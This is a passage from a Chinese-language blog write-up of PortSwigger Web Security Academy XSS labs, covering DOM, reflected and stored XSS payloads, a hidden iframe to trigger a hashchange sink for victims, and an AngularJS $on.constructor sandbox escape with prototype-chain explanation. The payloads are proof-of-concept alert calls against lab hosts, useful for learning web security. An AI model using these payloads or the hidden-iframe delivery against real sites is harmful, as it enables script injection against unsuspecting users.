<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509091228400.png" alt="image-20250909122809234"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>成功弹窗，但是我们这个hash改变事件要主动改变#后面的值才行，用户肯定是不会自己改变的。我的意思是假如我们把这个 payload发给用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/#&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>用户打卡是并不会弹窗的，因为没有改这个 # 后面的值就不会触发 hashchange 事件，所以我们要主动修改 src，找到一个方法首先加载 普通的 url，然后加载完url之后，我们把payload插入 url中。</p>
<p>我们可以使用 iframe 标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://0a1d00120321917c80bd0301008f001b.web-security-academy.net/#&quot; onload=&quot;this.src+=&#x27;&lt;img src=1 onerror=print()&gt;&#x27;&quot; &gt;</span><br></pre></td></tr></table></figure>

<p>如此，可以在src加载时修改hash的值，当然也可以加上hidden属性，这样用户看不到就更hacker了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://0a1d00120321917c80bd0301008f001b.web-security-academy.net/#&quot; onload=&quot;this.src+=&#x27;&lt;img src=1 onerror=print()&gt;&#x27;&quot; hidden=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>



<p>我们把这个挂在服务器上，发给用户就行了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509091245929.png" alt="image-20250909124547800"></p>
<h3 id="Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><a href="#Lab-Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded" class="headerlink" title="Lab: Reflected XSS into attribute with angle brackets HTML-encoded"></a>Lab: Reflected XSS into attribute with angle brackets HTML-encoded</h3><blockquote>
<p>This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.</p>
<p>这个实验在博客搜索功能中存在一个反射型跨站脚本漏洞，其中尖括号会被 HTML 编码。要解决这个实验，请实施一次跨站脚本攻击，注入一个属性并调用 alert 函数。</p>
</blockquote>
<p>我们继续输入 she11f 然后全局搜索一下，发现写进了 input 标签的 value 属性里面</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509092235316.png" alt="image-20250909223543226"></p>
<p>因为尖括号会被 HTML 编码，所以我们可以闭合 value 属性，然后绑定一个事件触发它来实现 alert 函数的调用，可以查询 xss 速查表</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet%EF%BC%8C%E6%89%BE%E5%88%B0">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet，找到</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xss onfocus=alert(1) autofocus tabindex=1&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onfocus=alert(1) autofocus &quot;</span><br><span class="line">&quot;onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure>



<h3 id="Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><a href="#Lab-Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded" class="headerlink" title="Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded"></a>Lab: Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded</h3><blockquote>
<p>This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. </p>
<p>这个实验在评论功能中存在一个存储型跨站脚本漏洞。要解决这个实验，请提交一条评论，使得当点击评论的作者名称时，会调用 alert 函数。</p>
</blockquote>
<p>看题目描述和题目名，应该是要给 href 属性调用 js 伪协议触发 alert 事件了。</p>
<p>根据题目描述我们在帖子评论区填入 she11f 看一看,记得是 website 那里填入才是 a 标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;author&quot; href=&quot;she11f&quot;&gt;she11f&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>Payload </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure>



<h3 id="Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><a href="#Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded" class="headerlink" title="Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded"></a>Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded</h3><blockquote>
<p>This lab contains a reflected cross-site scripting vulnerability in the  search query tracking functionality where angle brackets are encoded.  The reflection occurs inside a JavaScript string. To solve this lab,  perform a cross-site scripting attack that breaks out of the JavaScript  string and calls the <code>alert</code> function.</p>
<p>此实验包含一个反射型跨站脚本漏洞，该漏洞存在于搜索查询跟踪功能中，其中尖括号被编码。反射发生在 JavaScript 字符串内部。要解决此实验，请执行一次跨站脚本攻击，突破 JavaScript 字符串的限制并调用 alert 函数。</p>
</blockquote>
<p>依旧输入一个 she11f ，全局搜索</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var searchTerms = &#x27;she11f&#x27;;</span><br><span class="line">document.write(&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;+encodeURIComponent(searchTerms)+&#x27;&quot;&gt;&#x27;);</span><br></pre></td></tr></table></figure>

<p>在一段 javasript 内部发现了我们的字符串，很明显了，我们得闭合单引号写入 js 代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">she11f&#x27;; alert(1); /*</span><br><span class="line">she11f&#x27;; alert(1); //</span><br><span class="line">she11f&#x27;; alert(1);&#x27;</span><br></pre></td></tr></table></figure>

<p>还有就是 js 是动态语言，我们可以利用字符串拼接来实现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+alert(2)+&#x27;</span><br><span class="line">var searchTerms = &#x27;&#x27;+alert(2)+&#x27;&#x27;;</span><br></pre></td></tr></table></figure>

<p>也可以，-和+是一个道理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-alert(1)-&#x27;</span><br><span class="line">var searchTerms = &#x27;&#x27;-alert(1)-&#x27;&#x27;;</span><br></pre></td></tr></table></figure>



<h3 id="Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element"><a href="#Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element" class="headerlink" title="Lab: DOM XSS in document.write sink using source location.search inside a select element"></a>Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code> inside a select element</h3><blockquote>
<p>​            This lab contains a DOM-based cross-site scripting  vulnerability in the stock checker functionality. It uses the JavaScript <code>document.write</code> function, which writes data out to the page. The <code>document.write</code> function is called with data from <code>location.search</code> which you can control using the website URL. The data is enclosed within a select element.        </p>
<p>​            To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the <code>alert</code> function.        </p>
<p>此实验室包含库存查询功能中的一个基于 DOM 的跨站点脚本漏洞。该漏洞利用 JavaScript 的 document.write  函数将数据写入页面。document.write 函数会使用 location.search 中的数据进行调用，您可以使用网站 URL  进行控制。这些数据包含在 select 元素中。 为了解决这个实验，执行跨站点脚本攻击，突破选择元素并调用警报函数。</p>
</blockquote>
<p>打开是一个仓库库存查询系统，点进第一个注意到有一个 select 选择器，选择地区就能查询库存，我们注意到该位置有这么一段 javascript 代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> stores = [<span class="string">&quot;London&quot;</span>,<span class="string">&quot;Paris&quot;</span>,<span class="string">&quot;Milan&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> store = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;storeId&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(store) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;option selected&gt;&#x27;</span>+store+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;stores.<span class="property">length</span>;i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(stores[i] === store) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;option&gt;&#x27;</span>+stores[i]+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;/select&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>



<p>根据location.search的storeId字段来创建option，<code>location.search</code> 是 JavaScript 中用于获取当前 URL 中查询字符串（即 <code>?</code> 后面的部分）的属性，返回值包含 <code>?</code>及其后面的参数，所以我们打印一下 <strong>url+?productId&#x3D;1&amp;storeId&#x3D;she11f</strong>，因为和storeId有关，所以我们就在后面随便加一个storeId&#x3D;she11f。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.location.search</span><br><span class="line">&gt; &quot;?productId=1&amp;storeId=she11f&quot;</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509121229662.png" alt="image-20250912122936431"></p>
<p>确实用 <code>document.write</code> 写了一个 <code>option</code> 标签进去，那就很好了。</p>
<p><strong>payload：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">productId=1&amp;storeId=&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">productId=1&amp;storeId=&lt;script&gt;alert(456)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Lab-DOM-XSS-in-AngularJS-expression-with-angle-brackets-and-double-quotes-HTML-encoded"><a href="#Lab-DOM-XSS-in-AngularJS-expression-with-angle-brackets-and-double-quotes-HTML-encoded" class="headerlink" title="Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded"></a>Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</h3><blockquote>
<p>​            This lab contains a DOM-based cross-site scripting  vulnerability in a AngularJS expression within the search functionality.        </p>
<p>​            AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the <code>ng-app</code> attribute (also known as an AngularJS directive). When a directive is  added to the HTML code, you can execute JavaScript expressions within  double curly braces. This technique is useful when angle brackets are  being encoded.        </p>
<p>​            To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the <code>alert</code> function.        </p>
<p>该实验包含搜索功能中 AngularJS 表达式中基于 DOM 的跨站点脚本漏洞。 AngularJS 是一个流行的 JavaScript 库，它会扫描包含 ng-app 属性（也称为 AngularJS 指令）的 HTML  节点的内容。将指令添加到 HTML 代码中后，您可以执行双花括号内的 JavaScript 表达式。这种技术在对尖括号进行编码时非常有用。 为了解决这个实验问题，执行跨站点脚本攻击，执行 AngularJS 表达式并调用警报函数。</p>
</blockquote>
<p>拿到题还是很懵逼啊，只搜到了可以用类似 vue 一样的插值语法 2,也确实解析了，但是试了一下直接插入 alert 还是不行，后面才知道 Angularjs 对这类危险操作做了处理不会解析，直接看了一下 payload 给的是 <code>&#123;&#123;$on.constructor('alert(1)')()&#125;&#125;</code>,但是这个 payload 怎么来的就不得而知了，所以我们还是从这个 Angularjs 开始研究吧</p>
<p>题目的Angularjs是1.7.7版本，我们让豆包写个例子吧</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>AngularJS 1.7.7 远程导入示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="language-xml">        远程导入AngularJS 1.7.7版本库</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">        来源：cdnjs CDN（内容分发网络）</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">        作用：加载AngularJS框架核心功能，无需本地存储</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">    --&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.7/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="language-xml">    ng-app=&quot;myApp&quot;：声明当前页面为AngularJS应用，指定应用模块名为&quot;myApp&quot;</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">    ng-controller=&quot;myCtrl&quot;：为当前区域绑定控制器&quot;myCtrl&quot;，实现视图与数据的关联</span></span></span><br><span class="line"><span class="comment"><span class="language-xml"> --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">ng-app</span>=<span class="string">&quot;myApp&quot;</span> <span class="attr">ng-controller</span>=<span class="string">&quot;myCtrl&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="language-xml">        AngularJS表达式：双花括号&#123;&#123;&#125;&#125;内的内容会被框架解析执行,此处计算1+1的结果，页面会显示&quot;2&quot;</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">     --&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;&#123;1+1&#125;&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// 定义AngularJS应用模块</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// 参数1：模块名称&quot;myApp&quot;，需与ng-app属性值一致</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// 参数2：空数组[]表示该模块不依赖其他模块</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">var</span> app = angular.<span class="title function_">module</span>(<span class="string">&#x27;myApp&#x27;</span>, []);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// 定义控制器&quot;myCtrl&quot;，与ng-controller属性值对应</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// $scope：注入作用域对象，作为视图与控制器之间的数据桥梁</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        app.<span class="title function_">controller</span>(<span class="string">&#x27;myCtrl&#x27;</span>, <span class="keyword">function</span>(<span class="params">$scope</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">// 在作用域中定义name变量，值为&quot;she11f&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">// 该变量可在视图中通过&#123;&#123;name&#125;&#125;访问</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            $scope.<span class="property">name</span> = <span class="string">&quot;she11f&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509131931256.png" alt="image-20250913193112014"></p>
<p>在 AngularJS（1.x）中，<code>$scope</code> 是一个核心概念，它是<strong>视图（View）和控制器（Controller）之间的桥梁</strong>，用于在两者之间传递数据和方法。简单来说，<code>$scope</code> 就像一个 “数据容器”，控制器可以往里面存放数据或函数，视图则可以通过特定语法访问这些内容。所以我们在作用域中定义name变量可在视图中通过访问。</p>
<p>我们再插入一下 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$on.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>也是直接弹窗了，这个 <strong>$on</strong>,是 AngularJS 特有的，其实很多框架都有这种带 $ 符号作为前缀的方法名，说明这是某个框架自带的的方法，在 AngularJS 中，<code>$on</code> 是 <code>$scope</code> 对象上的一个方法，用于<strong>监听当前作用域上的事件</strong>（通常是自定义事件）</p>
<p>那我想在控制台看 <strong>$on.constructor</strong> 该怎么办，有一种办法可以访问，即使用 <strong>angular.element()</strong> 方法</p>
<blockquote>
<p>这是 AngularJS 提供的一个核心方法，用于将原生 DOM 元素（或 HTML 字符串）包装成 AngularJS 特有的元素对象（类似 jQuery 对象的 “增强版” DOM 元素）。</p>
</blockquote>
<p>被**angular.element()**包装好的DOM元素就能自带 <strong>scope()</strong> 方法了 ，就可以获取以获取该元素所在的作用域对象。<code>$scope</code> 是作用域对象的引用变量，所以是一个玩意。</p>
<p>我们来控制台走一遍上面的操作绑定一个<code>&lt;h1 id=&quot;h1&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/h1&gt;</code>并调用一下scope方法看一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509131953679.png" alt="image-20250913195315569"></p>
<p>翻一会这个 scope，最后在<code>&lt;prototype&gt;</code>下的<code>&lt;prototype&gt;</code> 找到了<code>$on</code> function，但是继续翻没有翻到 <strong>constructor</strong> 啊，根据js原型链调用的特性，我们继续翻 <code>$on</code> 里面的 <code>&lt;prototype&gt;</code> ,接着又翻到了 <code>$on</code> 下的 <code>&lt;prototype&gt;</code> 里的 <code>constructor</code></p>
<p>去 MDN 翻一下这个 <strong>constructor</strong> 是什么</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509132012316.png" alt="image-20250913201217168"></p>
<p><code>constructor</code> 是对象实例上的一个属性，它存储的是一个 “引用”（即指针），指向当初创建这个对象的构造函数本身，而不是函数的名字字符串。</p>
<p>在 JavaScript 中，<strong>所有函数本身都是 <code>Function</code> 构造函数的实例</strong>。因此，一个普通函数的默认 <code>constructor</code>（构造函数）是 <code>Function</code>。</p>
<p>那这个 <strong>Function</strong> 又是什么呢</p>
<blockquote>
<p><code>Function</code> 是 JavaScript 中用于创建函数对象的原生构造函数，是所有函数的 “元类型”。它提供了动态创建函数的能力</p>
</blockquote>
<p>使用方法就是</p>
<table>
<thead>
<tr>
<th>参数个数</th>
<th>解析方式</th>
<th>等价的函数定义</th>
</tr>
</thead>
<tbody><tr>
<td>0 个</td>
<td>无参数，空函数体</td>
<td><code>function () &#123;&#125;</code></td>
</tr>
<tr>
<td>1 个</td>
<td>参数为函数体，无参数</td>
<td><code>function () &#123; 函数体 &#125;</code></td>
</tr>
<tr>
<td>n 个（n ≥ 2）</td>
<td>前 n-1 个为形参，最后 1 个为函数体</td>
<td><code>function(形参1, 形参2, ...) &#123; 函数体 &#125;</code></td>
</tr>
</tbody></table>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function(&quot;console.log(&#x27;hello world&#x27;)&quot;)()</span><br></pre></td></tr></table></figure>

<p>成功打印，再试试 <strong>constructor</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let test = function test()&#123;&#125;</span><br><span class="line">test.constructor(&quot;console.log(&#x27;hello world&#x27;)&quot;)()</span><br></pre></td></tr></table></figure>

<p>也能成功打印，那我们再看看 <strong>$on.constructor</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509132029779.png" alt="image-20250913202941668"></p>
<p>正是原生构造函数 <strong>Function</strong>，所以 <strong>paylaod</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$on.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可能有人问为什么不直接用,<code>&#123;&#123;Function("alert('hello world')")()&#125;&#125;</code>，用了之后就会发现不起作用，其实就像开头一样为什么不直接 alert 弹，还是因为 Angularjs 的安全特性，所以我们才要利用 Angularjs 允许范围内访问的方法或者属性来构造攻击手法。知道原理了我们就能多试试其他方法了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$eval.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br><span class="line">&#123;&#123;$emit.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>ps：</strong>我对控制台这两个有点疑问，不知道究竟看哪个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prototype: Object &#123;&#125;</span><br><span class="line">&lt;prototype&gt;: function ()</span><br></pre></td></tr></table></figure>

<p>问了豆包说是</p>
<ul>
<li><code>prototype: Object &#123; … &#125;</code>：是构造函数的「原型对象」，用于定义实例的继承内容，本质是对象，<strong>定义该构造函数创建的「实例对象」会继承的属性和方法。</strong></li>
<li><code>&lt;prototype&gt;: function ()</code>：是当前对象的「内部原型」，指向原型链上层的一个函数对象（通常是 <code>Function.prototype</code> 或其他构造函数的原型），用于实现继承，<strong>构成原型链，对象通过它继承上层对象的属性和方法。</strong></li>
</ul>
<p>所以说是 function () 标记的<code> &lt;prototype&gt;</code> 是一个<strong>对象可以沿着原型链调用的函数和属性</strong>，Object { … }标记的prototype，举例来说就是当 $on <strong>被当作构造函数使用</strong>时，可以被继承的对象，不过 $on <strong>通常不会被当作构造函数使用</strong>（不会用 <code>new $on()</code> 去创建实例）。</p>
<p>所以我们这里调用函数的话只看 <strong><code>&lt;prototype&gt;: function ()</code></strong> 就行了</p>
<h3 id="Lab-Reflected-DOM-XSS"><a href="#Lab-Reflected-DOM-XSS" class="headerlink" title="Lab: Reflected DOM XSS"></a>Lab: Reflected DOM XSS</h3><blockquote>
<p>​		   This lab demonstrates a reflected DOM vulnerability. Reflected DOM  vulnerabilities occur when the server-side application processes data  from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing  it to a dangerous sink. 	</p>
<p>​			To solve this lab, create an injection that calls the <code>alert()</code> function. 	</p>
